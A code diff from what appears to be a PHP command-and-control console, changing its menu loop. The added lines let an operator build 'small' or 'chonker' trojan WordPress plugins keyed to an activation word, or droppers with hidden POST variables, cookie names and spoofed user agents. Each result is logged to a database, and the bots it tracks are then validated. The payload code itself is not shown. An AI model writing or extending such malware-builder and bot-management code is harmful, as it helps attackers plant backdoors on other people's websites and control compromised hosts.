@@ -47,36 +47,61 @@ while (true){
             break;
         case str_starts_with($c, "com") !== false:
             $m->commandMenu();
-
             break;
         case str_starts_with($c, "a") !== false:
             $m->addHostMenu();
             break;
         case str_starts_with($c, "cr") !== false:
             $m->dropperMenu();
-            if (str_contains(trim(strtolower(readline("-> "))), "press")){
-                $trj = new makeMeWordPressing(readline("Activation Keyword?\n->"));
-                $a = $trj->createTrojanWordpress();
-                $database->insertData([
-                    "action" => "add_press",
-                    "zip" => $a['TrojanPlugin'],
-                    "activator" => $a['ActivationWord']]
-                );
-            }else{
-                $trj = new slimDropper($agents->getRandomAgent(), $configs['alpha_chars']);
-                $a = $trj->generateDropper();
-                $database->insertData([
-                    "action" => "add_dropper",
-                    "location_on_disk" => $a['dropper'],
-                    "post_var" => $a['post_variable'],
-                    "cookiename" => $a['cookie_name'],
-                    "user_agent" => $a['user_agent']
-                ]);
-                readline();
+            $c = trim(strtolower(readline("-> ")));
+            switch ($c){
+                case str_contains($c,"small") !== false:
+                    $act_word = trim(readline("Activation Keyword: "));
+                    if (is_null($act_word) or $act_word === ""){
+                        $act_word = bin2hex(openssl_random_pseudo_bytes(24));
+                    }
+                    $trj = new makeMeWordPressing($act_word);
+                    $a = $trj->createSmallTrojanWordpress();
+                    $database->insertData([
+                            "action" => "add_press",
+                            "zip" => $a['TrojanPlugin'],
+                            "activator" => $a['ActivationWord']]
+                    );
+                    readline("Press the any key to continue.");
+                    break;
+                case str_contains($c, "chonker") !== false:
+                    $act_word = trim(readline("Activation Keyword: "));
+                    if (is_null($act_word) or $act_word === ""){
+                        $act_word = bin2hex(openssl_random_pseudo_bytes(24));
+                    }
+                    $trj = new makeMeWordPressing($act_word);
+                    $yay = $trj->createChonker();
+                    $database->insertData([
+                        "action" => "add_press",
+                        "zip" => $yay['TrojanPlugin'],
+                        "activator" => $yay['ActivationWord']
+                    ]);
+                    readline("Press the any key to continue.");
+                    break;
+                default:
+                    $trj = new slimDropper($agents->getRandomAgent(), $configs['alpha_chars']);
+                    $a = $trj->generateDropper();
+                    $database->insertData([
+                        "action" => "add_dropper",
+                        "location_on_disk" => $a['dropper'],
+                        "post_var" => $a['post_variable'],
+                        "cookiename" => $a['cookie_name'],
+                        "user_agent" => $a['user_agent']
+                    ]);
+                    readline("Press the any key to continue.");
+                    break;
             }
             break;
         case str_starts_with($c, "ch") !== false:
             $m->validateHost();
+            foreach ($database->grabOrFormatOutput(['type' => 'all_bots']) as $grabbedData => $item){
+                $validation = new \curlStuff\validateMeMore\talkToMeDamnit();
+            }
             break;
         case str_starts_with($c, "at") !== false:
             $m->addToolMenu();
